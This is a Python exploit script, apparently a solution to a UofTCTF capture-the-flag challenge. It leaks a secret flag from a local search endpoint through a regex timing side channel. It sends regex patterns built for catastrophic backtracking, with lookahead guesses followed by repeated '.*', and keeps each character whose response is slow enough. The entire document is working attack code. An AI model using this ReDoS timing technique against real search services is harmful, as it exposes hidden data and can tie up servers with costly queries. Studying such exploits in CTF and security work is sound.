import time
import requests
import re
import random
import string
def escape_regex(s):
    return re.sub(r'([.*+?^${}()|[\]\\])', r'\\\1', s)

def measure_time(guess):
    URL = "http://localhost:3000/search"
    json = {"query":"/^(?={{GUESS}}).*.*.*.*.*.*.*.*.*.*.*.*.*!!!!!!!!!!!!$/".replace("{{GUESS}}", escape_regex(guess)), "language":"All"}
    start = time.time()
    requests.post(URL, json=json)
    end = time.time()
    return end - start

def calculate_threshold(alphabet):
    random_inputs = random.sample(alphabet, 3)
    times = [measure_time(char) for char in random_inputs]
    return sum(times) / len(times)

def main():
    alphabet = string.printable
    flag = "uoftctf{"
    threshold = calculate_threshold(alphabet) + 0.4 # can adjust this for remote

    while True:
        for char in alphabet:
            current_time = measure_time(flag + char)
            if current_time > threshold:
                # try again to see if it was a fluke
                current_time = measure_time(flag + char)
                if current_time > threshold:
                    flag += char
                    print(flag)
                    if char == "}":
                        print(flag)
                        return
                else:
                    continue
                

if __name__ == "__main__":
    main()
